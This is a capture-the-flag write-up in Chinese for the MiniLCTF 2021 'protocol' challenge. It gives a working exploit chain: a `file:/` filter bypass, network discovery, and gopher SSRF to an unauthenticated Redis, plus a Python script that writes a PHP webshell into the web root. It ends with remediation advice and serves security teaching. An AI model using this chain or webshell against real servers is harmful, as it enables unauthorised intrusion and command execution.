# MiniLCTF 2021 - protocol

## 题目简述

入口页面把 POST 参数 `url` 原样交给 PHP cURL，只用正则阻止 `file://`、`dict`、`../`、`127.0.0.1` 和 `localhost`。另一个隐藏参数 `minisecret` 会执行 `ifconfig eth1`。利用链是：绕过 `file://` 过滤读取入口源码，泄漏容器网段，使用 SSRF 访问同网段 Redis，再通过 gopher 发送原始 RESP 命令，把 PHP WebShell 写到 Redis 容器的 Apache 目录并读取 `/flag`。

## 解题过程

cURL 接受单斜杠形式的 `file:/absolute/path`，而正则只匹配 `file://`。发送：

```text
url=file:/var/www/html/index.php
```

即可得到完整 PHP 源码，发现 `minisecret` 分支。再 POST 任意 `minisecret=1`，响应会显示 `eth1` 地址，例如 `172.192.15.2/24`。实际第三段由 Docker Compose 动态分配，应使用现场输出，不能写死参赛 WP 中的某个网段。

同网段另一容器同时运行 Redis 3.2.11 和 Apache，通常地址为相邻的 `.3`。入口正则没有阻止 `gopher`，Redis 也未认证。需要发送以下 RESP 命令：

```text
FLUSHALL
SET 1 "\n\n<?php system('cat /flag'); ?>\n\n"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
```

用脚本生成严格的 RESP 和百分号编码，避免手写长度错误：

```python
from urllib.parse import quote
import requests

def resp(*parts):
    out = f"*{len(parts)}\r\n".encode()
    for part in parts:
        if isinstance(part, str):
            part = part.encode()
        out += f"${len(part)}\r\n".encode() + part + b"\r\n"
    return out

stream = b"".join([
    resp("FLUSHALL"),
    resp("SET", "1", b"\n\n<?php system('cat /flag'); ?>\n\n"),
    resp("CONFIG", "SET", "dir", "/var/www/html"),
    resp("CONFIG", "SET", "dbfilename", "shell.php"),
    resp("SAVE"),
])

redis_ip = "172.192.15.3"  # 按 minisecret 的现场网段调整
gopher = f"gopher://{redis_ip}:6379/_" + quote(stream, safe="")
entry = "http://127.0.0.1:5000/index.php"
requests.post(entry, data={"url": gopher})

# 仍通过 SSRF 请求 Redis 容器上的 Apache。
r = requests.post(entry, data={"url": f"http://{redis_ip}/shell.php"})
print(r.text)
```

Redis 容器启动脚本把环境变量写入 `/flag` 后再清空变量，所以读取文件是正确目标。仓库只保留占位值，真实比赛 flag 不固定。

## 方法总结

该题依次考查协议解析差异、源码泄漏、容器网络发现、gopher SSRF 与 Redis 未授权写文件。黑名单的问题不仅是漏掉 `gopher`，还在于它试图用字符串匹配代替 URL 规范化和网络出口控制。修复应限制协议为明确的 `http/https`，解析并解析后校验目标 IP，禁止私网/环回访问，同时为 Redis 启用认证、最小权限并关闭危险配置命令。
